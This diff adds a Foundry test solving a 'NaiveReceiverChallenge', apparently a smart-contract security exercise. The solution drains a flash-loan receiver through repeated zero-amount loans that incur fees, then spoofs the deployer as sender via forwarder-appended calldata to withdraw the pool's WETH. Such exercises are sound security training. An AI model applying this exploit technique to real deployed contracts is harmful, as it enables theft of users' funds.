@@ -77,7 +77,97 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+        console.log("### test_naiveReceiver start ###");
+
+
+        console.log("");
+        console.log("#1 Before attack");
+        console.log("pool balance:", weth.balanceOf(address(pool))/1e18);
+        console.log("receiver balance:", weth.balanceOf(address(receiver))/1e18);
+        console.log("recovery balance:", weth.balanceOf(recovery)/1e18);
+        console.log("deployer deposits:", pool.deposits(address(deployer))/1e18);
+
+
+        console.log("");
+        console.log("#2 Run attack");
+        uint256 count = 10;
+        bytes[] memory _calldatas = new bytes[](count+1);
+
+
+        // Step 1: drain the receiver's WETH balance to 0 by making it take out 10 flash loans of 0 amount (but incurring the 1 WETH fee each time)
+        bytes memory _flashLoanData = abi.encodeCall(
+            pool.flashLoan,
+            (
+                receiver,
+                address(weth),
+                0,
+                ""
+            )
+        );
+
+
+        for (uint256 i = 0; i < count; i++) {
+            _calldatas[i] = _flashLoanData;
+        }
+
+
+        // Step 2: withdraw all WETH from the pool to the recovery account
+        _calldatas[count] = abi.encodePacked(
+            abi.encodeCall(
+                pool.withdraw,
+                (
+                    WETH_IN_POOL + WETH_IN_RECEIVER,
+                    payable(recovery)
+                )
+            ),
+            bytes32(uint256(uint160(deployer)))
+        );
+
+
+        // Encode the multicall to the pool
+        // This will execute all the flash loans and the withdraw in a single transaction
+        bytes memory _requestData = abi.encodeCall(
+            pool.multicall,
+            (_calldatas)
+        );
+
+
+        // Create the forwarder request:
+        // from must be the player, because only the player can sign the request
+        BasicForwarder.Request memory _request = BasicForwarder.Request({
+            from: player,
+            target: address(pool),
+            value: 0,
+            gas: 1000000,
+            nonce: forwarder.nonces(player),
+            data: _requestData,
+            deadline: block.timestamp + 1 days
+        });
+
+        // Sign the request
+        // The digest is the EIP-712 hash of the request
+        bytes32 _digest = keccak256(abi.encodePacked(
+            "\x19\x01",
+            forwarder.domainSeparator(),
+            forwarder.getDataHash(_request))
+        );
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, _digest);
+        bytes memory _signature = abi.encodePacked(r, s, v);
+
+
+        forwarder.execute{value: 0}(_request, _signature);
+
+
+        console.log("");
+        console.log("#3 After attack");
+        console.log("pool balance:", weth.balanceOf(address(pool))/1e18);
+        console.log("receiver balance:", weth.balanceOf(address(receiver))/1e18);
+        console.log("recovery balance:", weth.balanceOf(recovery)/1e18);
+        console.log("deployer deposits:", pool.deposits(address(deployer))/1e18);
+
+
+        console.log("");
+        console.log("### test_naiveReceiver end ###");
     }
 
     /**
